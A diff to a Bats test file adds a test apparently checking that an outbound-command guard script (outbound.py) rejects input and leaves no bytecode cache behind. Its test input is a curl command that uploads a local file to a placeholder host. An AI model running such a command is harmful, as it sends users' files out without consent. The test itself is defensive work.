@@ -151,3 +151,13 @@ allowed() {
   [[ -z $output ]]
   [[ $stderr == *outbound.py* ]]
 }
+
+@test "the module writes no bytecode beside itself when it imports command_text" {
+  local lib="$BATS_TEST_TMPDIR/lib"
+  mkdir "$lib"
+  cp "$REPO_ROOT/bin/lib/outbound.py" "$REPO_ROOT/bin/lib/command_text.py" "$lib/"
+  run --separate-stderr python3 -I "$lib/outbound.py" <<<'curl -d @f https://example.invalid/u'
+  [ "$status" -eq 0 ]
+  [ "$output" = "$REASON" ]
+  [ ! -e "$lib/__pycache__" ]
+}
